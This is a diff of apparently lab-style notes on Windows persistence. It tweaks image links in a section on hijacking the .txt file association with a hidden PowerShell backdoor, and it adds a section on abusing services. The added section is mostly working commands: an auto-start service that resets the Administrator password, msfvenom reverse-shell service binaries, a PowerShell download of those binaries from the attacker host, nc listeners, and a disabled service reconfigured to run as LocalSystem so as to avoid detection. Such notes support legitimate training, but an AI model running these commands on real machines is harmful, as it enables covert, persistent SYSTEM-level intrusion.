@@ -250,7 +250,7 @@ The default operating system file associations are kept inside the registry, whe
 
 We can then search for a subkey for the corresponding ProgID (also under HKLM\Software\Classes), in this case, txtfile, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under shell\open\command where the default command to be run for files with that extension is specified.
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 In this case, when you try to open a .txt file, the system will execute %SystemRoot%\system32\NOTEPAD.EXE %1, where %1 represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to C:\Windows\backdoor2.ps1.
 
@@ -271,7 +271,7 @@ Now let's change the registry key to run our backdoor script in a hidden window.
 powershell.exe -windowstyle hidden C:\windows\backdoor2.ps1 %1
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 Finally, create a listener for your reverse shell and try to open any .txt file on the victim machine (create one if needed). You should receive a reverse shell with the privileges of the user opening the file.
 
@@ -286,3 +286,145 @@ nc -lvp 4448
 <figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+
+## Abusing Services
+
+Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.
+
+A service is basically an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.
+
+There are two main ways we can abuse services to establish persistence: either create a new service or modify an existing one to execute our payload.
+
+### Creating backdoor services
+
+We can create and start a service named "THMservice" using the following commands.
+
+**Victim**
+
+```
+sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
+
+sc.exe start THMservice
+```
+
+**Note:** There must be a space after each equal sign for the command to work.
+
+The "net user" command will be executed when the service is started, resetting the Administrator's password to `Passwd123`. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.
+
+Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use the `exe-service` format in msfvenom.
+
+**Kali**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4448 -f exe-service -o rev-svc.exe
+```
+
+You can then copy the executable to your target system, say in `C:\Windows` and point the service's binPath to it.
+
+**Kali**
+
+```
+python2 -m SimpleHTTPServer 81
+```
+
+**Kali**
+
+```
+nc -lvnp 4448
+```
+
+**Victim(cmd)**
+
+```
+cd C:\Windows
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/rev-svc.exe','rev-svc.exe')" 
+```
+
+**Victim(cmd)**
+
+<pre><code>sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
+<strong>
+</strong><strong>sc.exe start THMservice2
+</strong></code></pre>
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+### Modifying existing services
+
+While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.
+
+You can get a list of available services using the following command.
+
+**Victim(cmd)**
+
+```
+sc.exe query state=all
+```
+
+<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+
+You should be able to find a stopped service called THMService3. To query the service's configuration, you can use the following command.
+
+**Victim(cmd)**
+
+```
+sc.exe qc THMService3
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+There are three things we care about when using a service for persistence:
+
+* The executable (**BINARY\_PATH\_NAME**) should point to our payload.
+* The service START\_TYPE should be automatic so that the payload runs without user interaction.
+* The **SERVICE\_START\_NAME**, which is the account under which the service will run, should preferably be set to **LocalSystem** to gain SYSTEM privileges.
+
+Let's start by creating a new reverse shell with msfvenom.
+
+**Kali**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=5558 -f exe-service -o rev-svc2.exe
+```
+
+**Kali**
+
+```
+python2 -m SimpleHTTPServer 81
+```
+
+**Kali**
+
+```
+nc -lvnp 5558
+```
+
+**Victim(cmd)**
+
+```
+cd C:\Windows
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/rev-svc2.exe','rev-svc2.exe')" 
+```
+
+**Victim(cmd)**
+
+```
+sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+
+sc.exe start THMservice3
+```
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+
+
+
+
